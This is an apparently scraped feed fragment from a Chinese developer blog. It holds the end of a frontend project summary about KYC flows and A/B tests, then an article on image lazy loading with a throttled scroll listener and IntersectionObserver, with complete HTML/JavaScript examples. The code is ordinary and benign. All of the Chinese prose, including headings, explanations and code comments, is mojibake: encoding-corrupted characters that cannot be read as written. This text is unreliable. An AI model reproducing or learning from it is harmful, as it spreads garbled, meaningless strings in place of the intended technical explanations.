<p>âœ… <strong>æ–°æ‰‹å¼•å¯¼è¿­ä»£ï¼ˆAB å®éªŒè¿›è¡Œä¸­ï¼‰</strong></p>
<ul>
<li>KYC çŠ¶æ€ä» 2 ç§æ‰©å±•åˆ° 6 ç§ï¼ˆè¦†ç›–å…¨æµç¨‹ï¼‰</li>
<li>æ–°æ‰‹ä»»åŠ¡å¥–åŠ±å±•ç¤ºï¼ˆKYC + å…¥é‡‘åŒä»»åŠ¡ï¼‰</li>
<li>å€’è®¡æ—¶ç»„ä»¶ï¼ˆå®æ—¶æ›´æ–°å‰©ä½™æ—¶é—´ï¼‰</li>
<li>åŠ¨æ€è§†é¢‘å¼•å¯¼ï¼ˆWebP æ ¼å¼ï¼Œè‡ªåŠ¨æ’­æ”¾ï¼‰</li>
<li>AB å®éªŒæ§åˆ¶é€»è¾‘ï¼ˆuseSensors åŠ¨æ€åˆ†ç»„ï¼‰</li>
</ul>
<p>âœ… <strong>æ•°æ®åŸ‹ç‚¹ä½“ç³»</strong></p>
<ul>
<li>Markets æ¨¡å—ï¼š3 ä¸ªå…³é”®èŠ‚ç‚¹ï¼ˆæ›å…‰ã€æ·»åŠ ã€åˆ é™¤ï¼‰</li>
<li>Guides æ¨¡å—ï¼š6 ç§ KYC çŠ¶æ€åŸ‹ç‚¹ + AB åˆ†ç»„æ ‡è®°</li>
<li>My Assets æ¨¡å—ï¼šè¡¥å……èµ„äº§è¯¦æƒ…ç‚¹å‡»åŸ‹ç‚¹</li>
</ul>
<h3 data-id="heading-22">äºŒã€æŠ€æœ¯äº®ç‚¹</h3>
<h4 data-id="heading-23">2.1 çŠ¶æ€ç®¡ç†ä¼˜åŒ–</h4>
<p><strong>æˆæœï¼š</strong></p>
<ul>
<li>API è°ƒç”¨æ¬¡æ•°å‡å°‘ 40%ï¼ˆé€šè¿‡ Context å…±äº«æ•°æ®ï¼‰</li>
<li>æ“ä½œå“åº”æ—¶é—´ &lt; 100msï¼ˆä¹è§‚æ›´æ–°ç­–ç•¥ï¼‰</li>
<li>çŠ¶æ€åŒæ­¥å‡†ç¡®ç‡ 100%ï¼ˆå»¶è¿Ÿåˆ·æ–°æœºåˆ¶ï¼‰</li>
</ul>
<p><strong>æŠ€æœ¯æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useCollect</span>() â†’ æœ¬åœ°çŠ¶æ€ç«‹å³æ›´æ–° â†’ å¼‚æ­¥åŒæ­¥æœåŠ¡ç«¯ â†’ åˆ‡æ¢ Tab æ—¶åˆ·æ–°
</code></pre>
<h4 data-id="heading-24">2.2 ä»£ç å¤ç”¨ç‡æå‡</h4>
<p><strong>æˆæœï¼š</strong></p>
<ul>
<li>PC å’Œ H5 å…±äº« 70% ç»„ä»¶ä»£ç </li>
<li>è‡ªå®šä¹‰ Hook å°è£… 5 ä¸ªæ ¸å¿ƒé€»è¾‘</li>
<li>ä»£ç è¡Œæ•°å‡å°‘ 30%ï¼ˆç›¸æ¯”åˆç‰ˆè®¾è®¡ï¼‰</li>
</ul>
<p><strong>å…³é”® Hooksï¼š</strong></p>
<ul>
<li><code>useCollect</code> - æ”¶è—çŠ¶æ€ç®¡ç†ï¼ˆ220 è¡Œï¼‰</li>
<li><code>useKycStatus</code> - KYC çŠ¶æ€ç®¡ç†</li>
<li><code>useNewbieTaskRewards</code> - æ–°æ‰‹ä»»åŠ¡å¥–åŠ±ç®¡ç†</li>
<li><code>useMarketData</code> - å¸‚åœºæ•°æ®å…±äº«</li>
<li><code>useSensors</code> - AB å®éªŒæ§åˆ¶</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7600863478929866771</link>    <guid>https://juejin.cn/post/7600863478929866771</guid>    <pubDate>2026-01-30T12:30:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929866771" data-draft-id="7600663744192200740" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-30T12:30:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é‡‘é±¼Y"/> <meta itemprop="url" content="https://juejin.cn/user/3124127510042122"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3124127510042122/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é‡‘é±¼Y
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:30:56.000Z" title="Fri Jan 30 2026 12:30:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>å½“æˆ‘ä»¬è¿›å…¥æŸä¸ªåŒ…å«å¤§é‡å›¾ç‰‡çš„ç½‘ç«™æ—¶ï¼Œç½‘é¡µå†…çš„å›¾ç‰‡å´è¿Ÿè¿ŸåŠ è½½ä¸å‡ºæ¥ï¼Œç»™æˆ‘ä»¬å¸¦æ¥äº†æå·®çš„ç”¨æˆ·ä½“éªŒï¼Œè€Œæ‡’åŠ è½½æŠ€æœ¯ï¼Œæ­£æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„æœ‰æ•ˆæ‰‹æ®µä¹‹ä¸€ã€‚</p>
<p>ä¼ ç»Ÿçš„æ»šåŠ¨ç›‘å¬æ‡’åŠ è½½æ–¹å¼åœ¨è¿‡å»å‘æŒ¥äº†é‡è¦ä½œç”¨ï¼Œä½†éšç€æŠ€æœ¯çš„ä¸æ–­é©æ–°ï¼Œ2026å¹´çš„ä»Šå¤©ï¼Œæˆ‘ä»¬æœ‰äº†æ›´ä¸ºç°ä»£ã€é«˜æ•ˆçš„æ–¹æ¡ˆå¯ä¾›é€‰æ‹©ã€‚æ¥ä¸‹æ¥ï¼Œå°±è®©æˆ‘ä»¬æ·±å…¥æ¢ç©¶ä¸€ç•ªã€‚</p>
</blockquote>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯æ‡’åŠ è½½ ï¼Ÿ</h2>
<p>æ‡’åŠ è½½ï¼ˆLazy Loadingï¼‰æ˜¯å‰ç«¯å¼€å‘ä¸­<strong>å»¶è¿ŸåŠ è½½éå…³é”®èµ„æº</strong>çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šè¿‡<code>ä»…åœ¨èµ„æºè¿›å…¥ç”¨æˆ·å¯è§†åŒºåŸŸæ—¶åŠ è½½</code>ï¼Œæ˜¾è‘—å‡å°‘åˆå§‹è¯·æ±‚æ•°ã€é™ä½å†…å­˜å ç”¨ï¼Œæå‡é¡µé¢åŠ è½½é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒåŸç†ï¼šæŒ‰éœ€åŠ è½½çš„æœ¬è´¨</h2>
<p>æ‡’åŠ è½½çš„æ ¸å¿ƒé€»è¾‘åŸºäºè§†çª—æ£€æµ‹å’Œæ¡ä»¶è§¦å‘ï¼Œåˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<ol>
<li><strong>èµ„æºæš‚å­˜</strong>:å°†çœŸå®çš„èµ„æºåœ°å€ï¼ˆå¦‚å›¾ç‰‡çš„é“¾æ¥ï¼‰å­˜å‚¨åœ¨HTML5çš„è‡ªå®šä¹‰å±æ€§ï¼ˆå¦‚data-srcï¼‰ä¸­ï¼Œè€Œéç›´æ¥èµ‹å€¼ç»™srcï¼Œé¿å…åˆæ¬¡åŠ è½½ã€‚</li>
<li><strong>è§†çª—æ£€æµ‹</strong>ï¼šé€šè¿‡ç›‘å¬æ»šåŠ¨äº‹ä»¶æˆ–è€…ä½¿ç”¨æµè§ˆå™¨APIï¼ˆå¦‚<code>Intersection Observer</code>ï¼‰ï¼Œåˆ¤æ–­èµ„æºæ˜¯å¦è¿›å…¥ç”¨æˆ·çš„å¯è§†åŒºåŸŸã€‚</li>
<li><strong>åŠ¨æ€åŠ è½½</strong>ï¼šå½“èµ„æºè¿›å…¥è§†çª—å†…ï¼Œå°†data-srcçš„å€¼èµ‹å€¼ç»™srcï¼Œè§¦å‘æµè§ˆå™¨åŠ è½½çœŸå®èµ„æºã€‚</li>
</ol>
<p>å…¶æœ¬è´¨å°±æ˜¯å°†â€œä¸€æ¬¡æ€§å…¨é‡åŠ è½½â€è½¬åŒ–ä¸ºâ€œæŒ‰éœ€å¢é‡åŠ è½½â€ï¼Œå‡å°‘åˆå§‹é¡µé¢çš„èµ„æºè¯·æ±‚å’Œæ¸²æŸ“å‹åŠ›ã€‚</p>
<h2 data-id="heading-3">å®ç°æ–¹æ³•</h2>
<h3 data-id="heading-4">1. åŸç”ŸJavaScriptå®ç° - ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬</h3>
<h4 data-id="heading-5">å®šä¹‰æ ¸å¿ƒå˜é‡</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f44f959ca801419ab3e070a7a81995bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=rY1t%2FqmxYKrKtKxksxRq9ehEE9c%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè·å–å½“å‰æµè§ˆå™¨çª—å£çš„å¯è§†é«˜åº¦ï¼ˆå•ä½ï¼šåƒç´ ï¼‰ï¼Œç”¨äºåˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›å…¥ç”¨æˆ·è§†é‡ã€‚</li>
</ul>
<h4 data-id="heading-6">æ‡’åŠ è½½æ ¸å¿ƒå‡½æ•°</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d169b7340e28486bb0be7fabbd2b5087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=CYvzBgZGpoqKl%2BOMkzTPtC7uT8Q%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>getBoundingClientRect()</strong>ï¼šÂ è¿”å›å…ƒç´ çš„ä½ç½®ä¿¡æ¯ï¼ˆ<code>top</code>/<code>bottom</code>/<code>left</code>/<code>right</code>ç­‰ï¼‰ï¼Œæ˜¯åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨è§†å£å†…çš„æ ¸å¿ƒä¾æ®ã€‚</li>
<li><strong>è‡ªå®šä¹‰å±æ€§</strong>ï¼š<code>data-origin</code>Â å­˜å‚¨å›¾ç‰‡çš„çœŸå®URLï¼ˆé¿å…åˆå§‹åŠ è½½ï¼‰ï¼Œ<code>lazyload</code>Â æ ‡è®°å›¾ç‰‡ä¸ºâ€œå¾…åŠ è½½çŠ¶æ€â€</li>
</ul>
<h4 data-id="heading-7">åˆå§‹åŒ–ä¸æ»šåŠ¨ç›‘å¬</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c7246943f084a88aa9a7f33be9887dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=6Bu8bYXwl86nAzUPr6GKp6RBvT8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>åˆå§‹åŒ–æ‰§è¡Œ</strong>ï¼šé¡µé¢åŠ è½½å®Œæˆåç«‹å³è°ƒç”¨Â <code>lazyLoad()</code>ï¼Œç¡®ä¿é¦–å±å›¾ç‰‡æ­£å¸¸æ˜¾ç¤ºã€‚</li>
<li><strong>æ»šåŠ¨ç›‘å¬</strong>ï¼šå½“ç”¨æˆ·æ»šåŠ¨é¡µé¢æ—¶ï¼ŒæŒç»­åˆ¤æ–­åç»­å›¾ç‰‡æ˜¯å¦è¿›å…¥è§†å£ï¼Œä½†ç›´æ¥ç›‘å¬Â <code>scroll</code>Â ä¼šå¯¼è‡´äº‹ä»¶è§¦å‘è¿‡äºé¢‘ç¹ï¼ˆæ¯ç§’å¯èƒ½è§¦å‘æ•°åæ¬¡ï¼‰ï¼Œå› æ­¤éœ€è¦<strong>èŠ‚æµå‡½æ•°</strong>ä¼˜åŒ–ã€‚</li>
</ul>
<h4 data-id="heading-8">èŠ‚æµå‡½æ•° - throttle()</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db002c53851461d8b2109af7605b784~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=HKM37FAUkgEWFb8NMRmaHpy1fys%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šé™åˆ¶Â <code>lazyLoad</code>Â çš„æ‰§è¡Œé¢‘ç‡ï¼ˆç¤ºä¾‹ä¸­ä¸º<strong>æ¯1000æ¯«ç§’æ‰§è¡Œä¸€æ¬¡</strong>ï¼‰ï¼Œé¿å…æ»šåŠ¨æ—¶é¢‘ç¹è§¦å‘å‡½æ•°å¯¼è‡´æ€§èƒ½æµªè´¹ã€‚</li>
<li><strong>é—­åŒ…ç‰¹æ€§</strong>ï¼š<code>preTime</code>Â å˜é‡è¢«é—­åŒ…ä¿å­˜ï¼Œæ¯æ¬¡æ»šåŠ¨æ—¶éƒ½ä¼šå¯¹æ¯”â€œå½“å‰æ—¶é—´â€ä¸â€œä¸Šæ¬¡æ‰§è¡Œæ—¶é—´â€ï¼Œç¡®ä¿åœ¨è§„å®šé—´éš”å†…åªæ‰§è¡Œä¸€æ¬¡</li>
</ul>
<h4 data-id="heading-9">å®Œæ•´ä»£ç ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">img</span> {
            <span class="hljs-attribute">display</span>: block;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">lazyload</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">data-origin</span>=<span class="hljs-string">"å›¾ç‰‡åœ°å€"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¤šå¼ å›¾ç‰‡çœç•¥ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// å¯è§†åŒºåŸŸçš„é«˜åº¦</span>
        <span class="hljs-keyword">const</span> viewHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyLoad</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> imgs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img[lazyload]'</span>)
            <span class="hljs-comment">// åˆ¤æ–­å“ªäº› img åœ¨å¯è§†åŒºåŸŸå†…</span>
            imgs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
                <span class="hljs-comment">// itemæ˜¯å¦åœ¨å¯è§†åŒºåŸŸå†…</span>
                <span class="hljs-keyword">const</span> rect = item.<span class="hljs-title function_">getBoundingClientRect</span>() 
                <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">top</span> &lt; viewHeight &amp;&amp; rect.<span class="hljs-property">bottom</span> &gt;= <span class="hljs-number">0</span>) {
                    item.<span class="hljs-property">src</span> = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">origin</span>
                    item.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'lazyload'</span>)
                }
            })
        }
        
        <span class="hljs-title function_">lazyLoad</span>()

        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-title function_">throttle</span>(lazyLoad, <span class="hljs-number">1000</span>))<span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ä½“</span>

        <span class="hljs-comment">//èŠ‚æµ-åœ¨è§„å®šçš„æ—¶é—´å†…åªè§¦å‘ä¸€æ¬¡</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, <span class="hljs-keyword">await</span></span>) {
            <span class="hljs-keyword">let</span> preTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
            <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> nowTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
                <span class="hljs-keyword">if</span> (nowTime - preTime &gt;= <span class="hljs-keyword">await</span>) {
                    <span class="hljs-title function_">fn</span>()
                    preTime = nowTime
                }
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">2. ç°ä»£æµè§ˆå™¨æ–¹æ¡ˆ - Intersection Observer API</h3>
<p><code>Intersection Observer</code>æ˜¯<strong>åŸºäºç°ä»£æµè§ˆå™¨åŸç”Ÿ API çš„å›¾ç‰‡æ‡’åŠ è½½æ–¹æ¡ˆ</strong>ï¼Œç›¸æ¯”ä¼ ç»Ÿçš„æ»šåŠ¨ç›‘å¬+èŠ‚æµï¼Œå®ƒæ›´é«˜æ•ˆã€æ›´ç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘æ˜¯<strong>ç”±æµè§ˆå™¨è‡ªåŠ¨ç›‘å¬å›¾ç‰‡æ˜¯å¦è¿›å…¥è§†å£</strong>ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†æ»šåŠ¨äº‹ä»¶ã€‚</p>
<h4 data-id="heading-11">åˆ›å»ºè§‚å¯Ÿå™¨å®ä¾‹</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e11404e2b1e452598013cbf6d338685~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=VGe7pR0WnyYptd6BcrSB8%2BFMxjE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>item.isIntersecting</strong> :Â å¸ƒå°”å€¼ï¼Œç›´æ¥è¡¨ç¤ºå…ƒç´ æ˜¯å¦è¿›å…¥è§†å£ï¼ˆæ— éœ€æ‰‹åŠ¨è®¡ç®—ä½ç½®ï¼‰ã€‚</li>
<li><strong>item.target</strong> :Â å½“å‰è¢«è§‚å¯Ÿçš„ DOM å…ƒç´ ï¼ˆå³å›¾ç‰‡ï¼‰ã€‚</li>
<li><strong>io.unobserve(item.target)</strong> :Â åœæ­¢å¯¹å·²åŠ è½½å›¾ç‰‡çš„è§‚å¯Ÿï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæ¶ˆè€—ã€‚</li>
</ul>
<h4 data-id="heading-12">æ‰¹é‡è§‚å¯Ÿå¾…åŠ è½½å›¾ç‰‡</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7943ccf93e5240839876536ccaa6c928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=beANz%2BfgWR%2BgGWXCBbLZpeqrKwg%3D" alt="image.png" loading="lazy"/></p>
<p>å°†é¡µé¢ä¸­æ‰€æœ‰æ ‡è®°ä¸ºÂ <code>lazyload</code>Â çš„å›¾ç‰‡æ³¨å†Œåˆ°è§‚å¯Ÿå™¨ä¸­ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ç›‘å¬å®ƒä»¬çš„è§†å£å¯è§æ€§å˜åŒ–ã€‚</p>
<h4 data-id="heading-13">å®Œæ•´ä»£ç ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
